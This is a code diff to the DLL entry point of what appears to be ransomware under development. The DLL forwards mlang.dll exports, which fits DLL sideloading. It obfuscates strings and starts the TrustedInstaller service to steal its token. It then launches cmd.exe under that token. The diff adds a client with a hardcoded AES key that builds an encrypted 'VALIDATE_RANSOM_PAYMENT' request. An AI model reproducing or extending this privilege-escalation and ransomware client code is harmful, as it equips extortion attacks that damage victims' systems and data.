@@ -1,6 +1,9 @@
 // dllmain.cpp : Defines the entry point for the DLL application.
 #include "../Headers/procutils.h"
 #include "../Headers/syscalls.h"
+#include "../Headers/client.h"
+#include "../Headers/net_common.h"
+#include "../Headers/aes.hpp"
 
 #pragma comment(linker, "/export:IsConvertINetStringAvailable=C:\\Windows\\System32\\mlang.IsConvertINetStringAvailable,@110")
 #pragma comment(linker, "/export:ConvertINetString=C:\\Windows\\System32\\mlang.ConvertINetString,@111")
@@ -31,6 +34,13 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 	switch ( ul_reason_for_call )
 	{
 	case DLL_PROCESS_ATTACH:		
+
+
+		//NET_BLOB newBlob = c.AESDecryptBlob(buff);
+		//OutputDebugStringA("decrypted blob");
+
+		//OutputDebugStringA(newBlob.aesKey.c_str());
+		//MessageBoxA(NULL, newBlob.aesKey.c_str(), "poop", MB_OK);
 		//_InsertSSN(55)
 
 		if ( !ProcessUtilities::Init() )
@@ -45,18 +55,33 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 		std::string strCmd   = std::string(HIDE("C:\\Windows\\System32\\cmd.exe /K whoami"));
 		std::wstring wstrCmd = std::wstring(strCmd.begin(), strCmd.end());
 		
+		OutputDebugStringA("systoken");
+
 		std::vector<wchar_t> cmd(wstrCmd.begin(), wstrCmd.end());
 		cmd.push_back(L'\0');
-
-		STARTUPINFO si = { 0 };
+		 
+		STARTUPINFO si = { 0 };																																			
 		PROCESS_INFORMATION pi;
 
 		DWORD  pid2  = ProcessUtilities::StartWindowsService(std::string(HIDE("TrustedInstaller")));
 		HANDLE token = ProcessUtilities::CreateProcessAccessToken(pid2);
-		if ( token == NULL && escalatedPriv != NULL )
-			token = escalatedPriv;
-		else
-			break;
+		if ( token == NULL )
+			OutputDebugStringA("no ti");
+		if ( escalatedPriv == NULL )
+			OutputDebugStringA("no winlogon");
+
+		//if ( token == NULL && escalatedPriv != NULL ) {
+		//	OutputDebugStringA("switch");
+		//	token = escalatedPriv;
+
+		//}
+		//else {
+		//	OutputDebugStringA("break");
+		//	break;
+		//}
+			
+
+		OutputDebugStringA("pat");
 
 		ProcessUtilities::OpenProcessAsImposter(
 			token,
@@ -70,9 +95,38 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 			&pi
 		);
 
+		OutputDebugStringA("attached");
+		Client c;
+		c.SetEncryptionKey("UAhasdoiJWOJUENSDjndfiUIERuihusdjOEopdubWOEpohniuosnf");
+		OutputDebugStringA("set encryption key");
+
+		ClientRequest r;
+		r.action = r.VALIDATE_RANSOM_PAYMENT;
+		r.client = nullptr;
+		r.valid = TRUE;
+		r.temp = "test value!";
+
+		OutputDebugStringA("created cr");
+
+		NET_BLOB b;
+		b.aesKey = "UAhasdoiJWOJUENSDjndfiUIERuihusdjOEopdubWOEpohniuosnf";
+		b.cr = r;
+		b.sr = {};
+
+		MessageBoxA(NULL, b.aesKey.c_str(), "poop", MB_OK);
+
+		BYTESTRING encrypted = NetCommon::AESEncryptBlob(b);
+		
+		NetCommon::DecryptByteString(encrypted, b.aesKey);
+		ClientRequest decrypted = *reinterpret_cast< ClientRequest* >( encrypted.data() );
+
+		OutputDebugStringA(decrypted.temp.c_str());
+
+
 		//wchar_t path[] = L"\\\\?\\C:\\Windows \\System32\\mlang.dll";
 		////SetFileAttributesA(path, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);
 
+		c.~Client();
 		ProcessUtilities::Clean();
 
 		//// query mac addresses
